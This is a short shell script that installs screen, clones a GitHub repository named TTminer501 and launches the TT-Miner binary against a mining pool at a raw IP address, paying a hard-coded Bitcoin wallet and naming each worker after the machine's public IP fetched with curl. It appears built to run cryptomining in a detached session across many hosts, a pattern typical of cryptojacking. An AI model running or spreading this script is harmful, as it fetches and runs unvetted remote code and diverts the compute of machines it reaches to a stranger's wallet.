#!/bin/sh
apt-get update
apt-get install zip unzip
apt install screen -y
screen -dmS er.sh 65 75
git clone https://github.com/azis07/TTminer501.git
cd TTminer501
chmod +x TT-Miner
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./TT-Miner -coin BTC -o 144.217.82.15:80 -u 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$ip  -p x -PRGN -RH
